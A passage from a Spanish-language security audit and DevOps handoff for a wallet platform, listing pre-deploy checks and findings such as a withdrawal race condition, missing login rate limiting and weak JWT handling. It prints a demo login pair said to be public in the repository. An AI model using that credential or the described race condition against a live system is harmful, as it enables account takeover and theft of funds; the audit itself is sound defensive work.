- [ ] Configurar `uvicorn --workers N --proxy-headers` si hay proxy reverso (para que `get_remote_address` en rate limiting reciba la IP real del cliente, no la IP del proxy)
- [ ] Revisar configuración de logging: nivel WARNING en producción (ya implementado), verificar que no se loguean objetos de provider completos

### Frontend

- [ ] Confirmar que `VITE_API_URL` apunta al dominio de producción del backend (no a localhost)
- [ ] Ejecutar `npm audit` y resolver vulnerabilidades críticas/altas antes del despliegue
- [ ] Evaluar migración de JWT de `localStorage` a cookie HttpOnly (SEC-04) — recomendado antes de go-live si el perfil de riesgo es alto
- [ ] Verificar que el build de producción (`vite build`) no expone source maps accesibles públicamente

### Infraestructura

- [ ] Configurar WAF (Web Application Firewall) con reglas de rate limiting a nivel de infraestructura como capa adicional a la del backend
- [ ] Asegurar que las conexiones entre backend y Supabase usan TLS (verificar `sslmode=require` en `SUPABASE_DB_URL`)
- [ ] Configurar alertas de monitorización para errores 401 en volumen anómalo (detección de intentos de fuerza bruta)
- [ ] Establecer política de rotación de secrets (JWT_SECRET_KEY, SUPABASE_SERVICE_ROLE_KEY) cada 90 días como mínimo

---

## Handoff para DevOps

### Acciones bloqueantes pre-deploy (deben resolverse antes de ir a producción)

**1. Race condition en retiros (SEC-01) — CRÍTICO**
Implementar `UPDATE ... WHERE available_balance >= amount RETURNING *` en `wallet_queries.py`. Sin esto, usuarios pueden extraer más fondos de los que tienen con peticiones concurrentes. Es un bug de pérdida económica directa.

**2. Rate limiting en /auth/login y /auth/register (SEC-02) — CRÍTICO**
Añadir `slowapi` al proyecto. Sin rate limiting, la plataforma es vulnerable a fuerza bruta y credential stuffing desde el primer día de operación.

**3. Cuenta demo en producción (SEC-06) — ALTO**
Asegurarse de que `003_seed.sql` NUNCA se ejecuta en el entorno de producción. Las credenciales `demo@co-computing.io` / `demo1234` son públicas en el repositorio de GitHub. Cualquier persona puede autenticarse como esa cuenta si existe en producción.

**4. Validación de entropía del JWT secret (SEC-03) — CRÍTICO**
Añadir el validador de longitud mínima en `Settings` y documentar el proceso de generación del secret en el runbook de despliegue. Verificar que el secret en producción tiene al menos 32 caracteres de alta entropía.

### Acciones de alta prioridad post-deploy inmediato (primera semana)

**5. JWT en localStorage (SEC-04) — ALTO**
Planificar la migración a cookie HttpOnly. Estimar 1-2 días de trabajo backend+frontend.

**6. Cabeceras de seguridad (SEC-10) — MEDIO**
Añadir CSP, HSTS, Referrer-Policy y Permissions-Policy al middleware. Trabajo de menos de 4 horas.

**7. Actualizar python-jose (SEC-15) — BAJO urgencia, MEDIO impacto**
Migrar a PyJWT en el siguiente sprint. Sin bloqueos arquitectónicos.

### Variables de entorno requeridas en el servidor de producción

```
SUPABASE_URL=https://<project-ref>.supabase.co
SUPABASE_SERVICE_ROLE_KEY=<solo en secrets manager, nunca en repo>
SUPABASE_DB_URL=postgresql://postgres.<ref>:<pwd>@<host>:6543/postgres?sslmode=require
JWT_SECRET_KEY=<openssl rand -hex 32>
JWT_ALGORITHM=HS256
JWT_EXPIRE_DAYS=7
FRONTEND_URL=https://<dominio-produccion.co-computing.io>
ENVIRONMENT=production
```

Verificar que ninguna de estas variables aparece en los logs de CI/CD. Si la plataforma usa GitHub Actions, deben configurarse como `Secrets` de repositorio, no como variables de entorno en texto plano.
